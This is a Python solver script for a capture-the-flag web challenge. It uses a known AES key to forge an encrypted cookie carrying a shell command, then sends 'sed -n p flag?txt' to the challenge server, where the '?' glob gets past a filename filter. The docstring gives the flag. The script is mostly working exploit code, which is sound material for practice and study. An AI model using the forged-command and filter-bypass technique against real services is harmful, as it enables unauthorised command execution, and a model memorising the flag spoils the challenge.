#!/usr/bin/env python3
"""
BhAcKAri Streaming Service - CTF Solver
Flag: bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}
"""

from Crypto.Cipher import AES
import requests

TARGET_5687 = "http://streaming.challs.ctf.bhackari.it:5687"
KEY = b'inshallah_nobody_will_steal_this'
IV  = bytes(16)

def encrypt_cmd(cmd_str: str) -> str:
    if not cmd_str.endswith('\n'):
        cmd_str += '\n'
    pad = 16 - (len(cmd_str) % 16)
    plaintext = cmd_str.encode() + bytes([pad] * pad)
    return AES.new(KEY, AES.MODE_CBC, IV).encrypt(plaintext).hex()

def decrypt_payload(hex_str: str) -> bytes:
    ct = bytes.fromhex(hex_str)
    if len(ct) % 16:
        ct += bytes(16 - len(ct) % 16)
    return AES.new(KEY, AES.MODE_CBC, IV).decrypt(ct)

def send_cmd(cmd_str: str) -> str:
    payload = encrypt_cmd(cmd_str)
    print(f"    Payload hex: {payload}")
    resp = requests.post(TARGET_5687 + "/", cookies={"payload": payload})
    # Flag ada di baris pertama, sebelum ASCII art braille
    # Filter: skip baris HTML, skip baris dengan karakter braille (U+2800+)
    for line in resp.text.split('\n'):
        stripped = line.strip()
        if not stripped:
            continue
        if stripped.startswith('<'):
            continue
        # skip braille/box drawing unicode
        if any(0x2800 <= ord(c) <= 0x2FFF for c in stripped):
            continue
        return stripped
    return "(no output)"

def main():
    print("[*] BhAcKAri Streaming Service - Solver")
    print()

    print("[*] Step 1: Decrypting index.html cookie to get AES key...")
    index_cookie = (
        "8724c6792e7393762199d1728f5982adb8c0dc1a1442c4a2143d2ce00abfc573"
        "d3f62220835420dab78b90f151288109c7094821764c6eddf0f26bac916d5e51"
        "f0314873fd76f44377d02b2859b9fe81b2b4f088280b85f75db68163a402aa33"
        "ee2f6fdcd68591232d1d2d4fb343ec855022bb572a571403f545525ac1b7fb21"
        "07d3b991c4f74b569653f568fdf15184a557aaf1cbd9dc8b34678748f8c1fdc1"
        "04848a02a8c0f9f790cc67e7dd5a6db595f6380ae4c2e5a443dab114130677b6"
        "87b8fd96de8bf2c853f2924602850efadaa9efb4b9151b04db0baf93eefa40d2"
        "e6c5ba288a2a90602ee61b224f1209d50013ab137c00c641352d980a41196b61"
        "41bf9b82af7f363c4d6c86dedd9b6866ebf6644b319869e8254f7d4e5a1a1f2f"
        "7aa1a1558a3d38e2f8b5c047f72beee67c7fbf3dc2a49310a4ac7ec712c9b81"
        "09fc0a76edf5915ee4209239d664262b4f24c7e986396c86a7112f5a762a75d0"
        "b8e2a34591706a39dfd10b818983f84302d8804cd85e8a302406868124b316e7"
        "aa5d25f71c2f97240f213f3ff6357e372b2abbfaa4110b9b1d919b3be3a7d272"
        "daf876130068db5bb1bc65f32a5658db58bf2ed3e2b5812e5e8899bfad6d448b"
        "31e52a946b790443cd4e86d27635dc22626586287615f6845f1a1ac638f4b6fb"
        "42340dfa902961d55371a0d083f33ecc8"
    )
    decrypted = decrypt_payload(index_cookie)
    print(f"    Key found  : {KEY.decode()}")
    print(f"    IV         : {IV.hex()}")
    print(f"    Mode       : AES-256-CBC")
    print(f"    Decrypted  : {decrypted[:80]}...")
    print()

    print("[*] Step 2: Reading flag using sed with ? glob bypass...")
    print("    'flag?txt' glob matches 'flag.txt', bypassing filename filter")
    result = send_cmd('{"cmd": "sed -n p flag?txt"}')
    print()
    print(f"[+] FLAG: {result}")

if __name__ == "__main__":
    main()
